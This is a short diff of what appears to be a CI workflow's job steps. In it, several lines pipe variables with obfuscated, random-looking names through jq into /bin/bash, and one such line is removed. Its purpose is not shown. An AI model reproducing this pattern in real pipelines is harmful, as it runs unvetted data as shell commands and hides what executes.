@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$kw131" | jq -r .mbh5609 | /bin/bash
           printf '%s' "$fk392" | jq -r .ebv21380 | /bin/bash
           echo $vf8 | jq -r .gho782 | /bin/bash
-          echo $vplw918 | jq -r .ad921 | /bin/bash
           printf '%s' "$rjxky2730" | jq -r .dzbv838 | /bin/bash
 
       - name: Save results
